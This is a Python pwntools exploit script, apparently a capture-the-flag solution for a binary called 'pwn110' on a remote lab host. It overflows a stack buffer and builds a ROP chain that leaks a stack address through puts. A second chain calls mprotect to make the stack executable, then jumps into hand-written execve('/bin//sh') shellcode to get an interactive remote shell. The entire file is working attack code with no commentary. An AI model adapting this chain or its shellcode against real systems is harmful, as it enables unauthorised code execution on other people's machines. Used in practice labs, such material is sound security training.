from pwn import *

context(arch="amd64", os="linux", endian="little")

elf = ELF("./pwn110")
rop = ROP(elf)

r = remote("10.10.25.129", 9010)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
jmp_rsp = 0x463c43

payload =  b"A" * 0x28
payload += p64(pop_rdi)
payload += p64(elf.sym["__libc_stack_end"])
payload += p64(elf.sym["puts"])
payload += p64(elf.sym["main"])

r.recvuntil(b"libc")
r.recv()
r.sendline(payload)

stack_end = u64(r.recvline().strip().ljust(8, b"\x00"))
stack_start = ~(0xfff) & stack_end

log.success(f"Stack Start: 0x{stack_start:x}")
log.success(f"Stack End: 0x{stack_end:x}")

r.clean()

payload =  b"A" * 0x28
payload += p64(pop_rdi) + p64(stack_start)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(elf.sym["mprotect"])
payload += p64(jmp_rsp)
payload += asm("""
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
""", arch="amd64")

r.sendline(payload)

r.interactive()








